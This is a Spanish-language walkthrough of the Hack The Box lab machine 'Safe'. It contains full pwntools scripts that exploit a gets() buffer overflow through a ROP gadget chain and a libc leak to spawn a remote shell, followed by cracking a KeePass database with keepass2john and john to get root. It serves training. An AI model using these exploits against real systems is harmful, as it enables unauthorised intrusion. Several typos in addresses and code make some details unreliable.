---
layout: post
title: HTB_Safe
date: 2023/07/10
slug: HTB_Safe
heroImage: /assets/machines.jpg
---

# Safe {-}

## Introduccion {-}

La maquina del dia se llama Safe.

El replay del live se puede ver aqui

[![S4vitaar Safe maquina](https://img.youtube.com/vi/8P_xeVB9Lhk/0.jpg)](https://www.youtube.com/watch?v=8P_xeVB9Lhk)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.147
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.147
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.147 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80,1377 10.10.10.147 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | ssh      | Conneccion directa | creds      |
| 80     | http     | Web, Fuzzing       |            |
| 1337   | http     | Web, Fuzzing       |            |

El resultado de Nmap nos muestra algo raro con el puerto **1337**. Lo miramos con **ncat**

```bash
nc 10.10.10.247 1337

What do you want me to echo back?
AA

Ncat: Broken pipe
```

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.147
```

Es un Apache 2.4.25 en un Debian y parece que sea la default page de apache2. 


#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.147 
```
, Vemos la pagina por por defecto de apache2.
Miramos el codigo fuente y vemos un commentario que dice 
```bash
 'myapp' can be dowloaded to analyse from here its running on port 1337 
```
.

Si ponemos la url 
```bash
 http://10.10.10.147/myapp 
```
 podemos descargar la app y analyzarla.
## Vulnerability Assessment {-}


### Analysis de myapp {-}

Si lanzamos la app descargada con el commando 
```bash
 ./myapp 
```
 vemos la misma cosa que lo que hemos encontrado en el puerto 1337.
Vamos a ver si esta app esta vulnerable a un Buffer Overflow

```bash
python -c 'print "A"*500'
./myapp

What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

#Output
zsh: segmentation fault ./myapp
```

### Buffer Overflow x64 usando Gadgets {-}

Primeramente vamos a analyzar el 
```bash
 myapp 
```
 con **Ghidra**.Lanzamos Ghidra, creamos un nuevo proyecto y importamos el binario 
```bash
 myapp 
```
.
Una vez importado, cojemos el binario y lo Drag & Dropeamos en el Dragon. Una vez cargado, nos pide si lo queremos analysar, le decimos que si.

En la parte derecha de Ghidra, hay un panel Symbol Tree que nos permite ver las funcciones del programa, pinchamos a la function **main** y vemos 
el codigo de esta funccion. Vemos que hay una variable 
```bash
 local_78 
```
 creada con un tamaño de 112 bits y que recupera la entrada de usuario con la 
funccion 
```bash
 gets(local_78) 
```
 que es vulnerable a un BufferOverflow.

Aqui vamos a analysar mas en profundidad el binario con **gdb** con **gef**.

```bash
gdb ./myapp
info functions
r

What do you want me to echo back? Hola probando
#Output
[Inferior 1 exited normally]

r
What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Aqui gdb nos saca un error y vemos que el 
```bash
 $rsp 
```
 esta sobre escito con lettras **A**


![Safe-rs-A](/assets/images/Safe-rsp-A.png) 
Aqui seguimos la Guia normal de un BOF.

1. Buscamos cuantos A son necessarios antes de sobre escribir el **rsp**

    - creamos un pattern de 150 caracteres
    
        ```bash
        gef➤ pattern create 150
        [+] Generating a pattern of 150 bytes (n=4)
        aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
        [+] Saved as '$_gef0'
        ```

    - lanzamos el script otra vez y pegamos los caracteres

        ```bash
        gef➤ r
        What do you want me to echo back? aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata
        aauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
        ```

    - el programa peta una vez mas pero el valor del 
```bash
 $rsp 
```
 a cambiado. Miramos el offset con el commando

        ```bash
        gef➤  pattern offset $rsp
        [+] Searching for '$rsp'
        [+] Found at offset 120 (little-endian search) likely
        ``` 

        Aqui vemos que tenemos que entrar 120 caracteres antes de sobre escribir el **rsp**.

    - Probamos con 120 A y 8 B. /!\ cuidado que como es una maquina x64 tenemos que poner 8 B y no 4.

        ```bash
        python -c '120*"A"+8*"B"'
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAABBBBBBBB

        gef➤ r
        What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
        #Output
        $rsp   : 0x00007fffffffde98  →  "BBBBBBBB"
        $rbp   : 0x4141414141414141 ("AAAAAAAA"?)
        $rsi   : 0x00000000004052a0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
        ```

    - añadimos 8 C para saber donde caen la cosas despues del **rsp**

        ```bash
        python -c '120*"A"+8*"B"+8*"C"'
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AABBBBBBBBCCCCCCCC

        gef➤ r
        What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
        #Output
        ```

1. Miramos las seguridades existentes del programa

    ```bash
    gef➤  checksec
    [+] checksec for '/home/s4vitar/Desktop/HTB/Safe/content/myapp'
    Canary                        : ✘ 
    NX                            : ✓ 
    PIE                           : ✘ 
    Fortify                       : ✘ 
    RelRO                         : Partial
    ```

Vemos aqui que el NX (DEP: Data Execution Prevention) esta enabled, lo que quiere decir que deshabilita la ejecucion de codigo en la pila.
Tenemos que encontrar una via alternativa.

Si recordamos, el analysis de la funccion main con **Ghidra** era la siguiente

```c
undefined8 main (void)
{
    char myVariable [112];

    system("/usr/bin/uptime");
    printf("\nWhat do you want me to echo back? ");
    gets(myVariable);
    puts(myVariable);
    return 0;
}
```

La idea aqui seria de burlar la llamada a la funccion system("/usr/bin/uptime") para que en vez de llamar a uptime, ejecute otra cosa. Esto se hace
cambiando la cadena de texto "/usr/bin/uptime" con "/bin/sh" por ejemplo.

Hay cosas que tenemos que tener en cuenta para hacer este processo. En 64bits, hay uno orden que tenemos que tener en cuenta durante la llamada a una funccion

```bash
 rdi rci rdx rcx r8 r9 
```
. Este order se llama **convencion de llamada**. Esto significa que los argumentos pasados por las funcciones estan almazenadas en uno
de estos registros y que siguen este orden.

Lo comprobamos de la siguiente manera.

1. Creamos un pequeño script en python para lanzar el pdb en modo debug con un breakpoint al inicio de la funccion main

    ```python
    #!/usr/bin/python3

    from pwn import *

    context(terminal=['tmux', 'new-window'])
    context(os='linux', arch='amd64)

    p = gdb.debug('.\myapp', 'b *main')

    p.recvuntil('What do you want me to echo back?')
    ```

1. Lanzamos el script con el comando 
```bash
 python3 exploit.py 
```

1. En este punto estamos parados en el principio de la funccion main, y añadimos un breakpoint al call de la funccion system

    - lo buscamos en el listing de ghidra

        ```{r, echo = FALSE, fig.cap="system function listing breakpoint", out.width="90%"}
            knitr::include_graphics("images/Safe-system-breakpoint.png")

![Safe-system-breakoit](/assets/images/Safe-system-breakpoint.png) 
        ```bash
        gef➤  b * 0x40116e
        gef➤  c
        gef➤  si
        gef➤  si
        gef➤  si
        gef➤  si
        ```

        el comando 
```bash
 b 
```
 significa Breakpoint, el comando 
```bash
 c 
```
 es para Continue y el 
```bash
 si 
```
 se puede traducir como siguiente instruccion.
        En este punto hemos llegado a la funccion system.

    - miramos lo que hay en el **rdi**

        ```bash
        gef➤  x/s $rdi
        #Output
        0x402008:   "/usr/bin/update"
        ```

        Aqui vemos que en el **rdi** esta la string correspondiendo al 
```bash
 /usr/bin/uptime 
```
 que es el comando que seria ejecutado por **system()**

Ahora que sabemos que el argumento pasado en la funccion **system()** tiene que ser previamente definida en el registro 
```bash
 rdi 
```
, miramos de que manera
podemos tomar el control de este registro para poner el comando que queremos.

Para hacer este truco, el Tito nos recomiendo en primer lugar inspeccionar el resto de funcciones existentes. Si lo miramos con **Ghidra** en el Symbol Tree,
vemos que hay una funccion que se llama test y que contiene las ejecuciones siguientes:

```{r, echo = FALSE, fig.cap="test function inspection", out.width="90%"}
    knitr::include_graphics("images/Safe-test-fct-inspection.png")
```

programa como nosotros queremos.
![Safe-test-fct-isectio](/assets/images/Safe-test-fct-inspection.png) 
Si miramos la funccion test, vemos que justo despues de la copia del 
```bash
 rsp 
```
 al 
```bash
 rdi 
```
, hay un comando **JMP** que significa Jump al registro **R13** donde a dentro, existe
una direccion (por el momento desconocida).
Aqui la idea seria cambiar lo que hay en el registro 
```bash
 R13 
```
 para injectarle la direccion de la function 
```bash
 system() 
```
.

Para hacer este truco, tenemos que pasar por Gadgets que seria un ropper en este caso. Podemos usar **gef** para buscar si existe un Gadget en este registro.

```bash
gef➤  ropper --search "pop r13"
```

```{r, echo = FALSE, fig.cap="gef search for gadgets", out.width="90%"}
    knitr::include_graphics("images/Safe-gadget-r13.png")
```

Aqui vemos que tenemos un Gadget 
```bash
 pop r13; pop r14; pop r15; 
```
 y tenemos la direccion **401206**. Esto quiere decir que podemos meter la direction de **system()** en

```bash
 r13 
```
 y por lo de 
```bash
 r14 
```
 y 
```bash
 r15 
```
, pondremos un byte nullo.
```python
![Safe-adet-r13](/assets/images/Safe-gadget-r13.png) 
#!/usr/bin/python3

from pwn import *

context(terminal=['tmux', 'new-window'])
context(os='linux', arch='amd64')

p = remote("10.10.10.147", 1337)
# p = gdb.debug('./myapp', 'b *main')

p.recvuntil("What do you want me to echo back?")

# gef➤  ropper --search "pop r13"
# 0x0000000000401206: pop r13; pop r14; pop r15; ret;
pop_r13 = p64(0x401206)
junk = ("A"*112).encode()
bin_sh = "/bin/sh\x00".encode()
# JMP => r13 [system()]
# 0000000000401040 <system@plt>:
#   401040:       ff 25 da 2f 00 00       jmpq   *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
#   40116e:       e8 cd fe ff ff          callq  401040 <system@plt>
system_plt = p64(0x40116e)
null = p64(0x0)
# â¯ objdump -D ./myapp | grep "test"
#   40100b:       48 85 c0                test   %rax,%rax
#   4010c2:       48 85 c0                test   %rax,%rax
#   401104:       48 85 c0                test   %rax,%rax
# 0000000000401152 <test>:
test = p64(0x401152)
#                             **************************************************************
#                             *                          FUNCTION                          *
#                             **************************************************************
#                             undefined test()
#             undefined         AL:1           <RETURN>
#                             test                                            XREF[3]:     Entry Point(*), 00402060, 
#                                                                                          00402108(*)  
#        00401152 55              PUSH       RBP
#        00401153 48 89 e5        MOV        RBP,RSP
#        00401156 48 89 e7        MOV        RDI,RSP # RDI => "/bin/sh\x00"
#        00401159 41 ff e5        JMP        R13 # => system($rdi)
p.sendline(junk + bin_sh + pop_r13 + system_plt + null + null + test)
p.interactive()
```

Todas las direcciones de memoria se han buscado con el comando 
```bash
 objdump -D ./myapp | grep "system" 
```
 o para la direccion de test con el
comando 
```bash
 objdump -D ./myapp | grep "test" 
```
. Estos comandos se puenden usar porque le PIE esta desabilitado.

En este caso, que hace el script. El script nos permite finalmente ejecutar el applicativo con un flujo distincto para
ganar accesso al systema. El flujo es el siguiente.

1. Lanzamos el binario
1. Introducimos 112 A (120 del offset menos los 8 bytes del comando "/bin/sh\x00") => 7 caracteres + 1 nullByte.
1. Introducimos el commando 
```bash
 /bin/sh\x00 
```

1. Apuntamos a la direccion del gadget
1. Sobre escribimos el
    - r13 con la direccion de system
    - r14 como nullo
    - r15 como nullo
1. Introducimos la direccion de la funccion test


### Buffer Overflow x64 usando Memory leak {-}

```python
#!/usr/bin/python3

# Libc leaked

from pwn import *

context(terminal=['tmux', 'new-window'])
context(os='linux', arch='amd64')

p = remote("10.10.10.147", 1337)
# p = gdb.debug('./myapp', 'b *main')

junk = ("A"*120).encode()

# gef➤  ropper --search "pop rdi"
# 0x000000000040120b: pop rdi; ret; 

pop_rdi = p64(0x40120b)

# objdump -D ./myapp | grep "system"
# 0000000000401040 <system@plt>:
#   401040:       ff 25 da 2f 00 00       jmpq   *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
#   40116e:       e8 cd fe ff ff          callq  401040 <system@plt>

system_plt = p64(0x401040)
main = p64(0x40115f)
got_puts = p64(0x404018)

payload = junk + pop_rdi + got_puts + system_plt + main # system("whoami")

print(p.recvline())
p.sendline(payload)
leak_puts = u64(p.recvline().strip()[7:-11].ljust(8, "\x00".encode()))

log.info("Leaked puts address: %x" % leak_puts)

libc_leaked = leak_puts - 0x68f90
log.info("Leaked libc address: %x" % libc_leaked)
bin_sh = p64(libc_leaked + 0x161c19)

payload = junk + pop_rdi + bin_sh + system_plt

p.recvline()
p.sendline(payload)

p.interactive()
```

La idea aqui seria de hacer una llamad a nivel de systema para arastrar la direccion de **puts**. El objetivo detras de esto es poder leakear la direccion para
poder computar la direccion de  **libc**. Esto no permiteria computar una direccion donde este una string de 
```bash
 /bin/sh 
```
. 

Esto se hace poniendo una direccion memoriaa una llamada de systema (esto nos dara un error)

```python
import os

os.system("whoami")
#Output
root

os.system("0x7fbac32bda8")
#Output
Error Not found.
```

y desde este error, aprovechar de recuperar la direccion de puts. Desde aqui podriamos encontrar todas la direcciones necessarias para ejecutar los comandos que queremos.
Para encontrar las direcciones podemos usar la web de [nullbyte](https://libc.nullbyte.cat/?q=puts%3Af90&l=libc6_2.24-11%2Bdeb9u4_amd64), podemos encontrar todos
los offsets de los comandos que queremos como el offset de la direccion de 
```bash
 system 
```
 y de la string 
```bash
 /bin/sh 
```
 basada por la direccion de puts.

- la direccion de libc seria la direccion de puts menos el offset de puts de la web
- la direccion de system seria la direccion de libc mas el offset de system
- la direccion de la string 
```bash
 /bin/sh 
```
 seria la direccion de libc mas el offset de str_bin_sh
## Vuln exploit & Gaining Access {-}

### Ganando accesso con un BOF x64 {-}


```bash
python3 exploit.py
#Output
$

whoami user
cat /home/user/user.txt
```

Ya tenemos la flag.
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
ls /home/user
```

Vemos un fichero 
```bash
 MyPassword.kdbx 
```
 y una serie de imagenes. Lo descargamos en nuestra maquina de atacante.

- en la maquina victima

    ```bash
    which busybox
    busybox httpd -f -p 8000
    ```

- en la maquina de atacante descargamos con 
```bash
 wget 
```
 todas las imagenes y el fichero 
```bash
 MyPasswords.kdbx 
```


Intentamos abrir el ficher 
```bash
 MyPasswords.kdbx 
```
 con la utilidad **keepassxc**

```bash
keepassxc MyPasswords.kdbx
```

Vemos que nos pregunta por una contraseña pero vemos que hay un fichero clave que seria una de las imagenes.
Podemos tratar de recuperar el hash del fichero con 
```bash
 keepass2john 
```
 pero tenemos que tener en cuenta que si hay un fichero
que esta utilizado como seguridad, tenemos que añadir el parametro -k.

```bash
keepass2john MyPasswords.kdbx -k IMG_0545.JPG
```

Como no sabemos exactamente que imagen es la buena, utilizaremos un oneLiner

```bash
for IMG in $(echo "IMG_0545.JPG IMG_0546.JPG IMG_0547.JPG IMG_0548.JPG IMG_0552.JPG IMG_0553.JPG "); do keepass2john -k $IMG MyPasswords.kdbx | sed "s/Mypasswords/$IMG/"; done > hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

Encontramos la contraseña con la imagen 0547. Si abrimos el keepassxc dando la imagen como keyfile y con la contraseña podemos entrar y vemos un directorio
llamado Root Password

ya podemos utilizar el comando 
```bash
 su root 
```
 y leer la flag.



